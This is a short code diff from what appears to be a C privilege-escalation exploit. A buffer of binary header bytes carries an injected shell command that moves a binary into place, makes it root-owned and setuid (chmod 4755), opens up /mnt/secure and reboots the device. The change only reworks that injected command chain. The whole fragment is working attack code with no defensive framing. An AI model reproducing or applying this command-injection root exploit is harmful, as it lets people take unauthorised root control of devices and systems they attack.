@@ -18,7 +18,7 @@ int main(int argc, char *argv[]) {
 	static char buf[] =
 		"\xff\xff\xff\x7f\x00\x00\x00\x00\x24\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 		"\";mv                                                                           "
-		SU "&& chown root:root " SU " && chmod 4755 " SU " && chmod 755 /mnt/secure && sync && /sbin/reboot;\"";
+		SU ";chmod 755 /mnt/secure;chown 0:0 " SU " && chmod 4755 " SU ";/sbin/reboot;\"";
 	char *prog = argv[0];
 	for (int i = 0; *prog; i++)
 		buf[i+25] = *prog++;
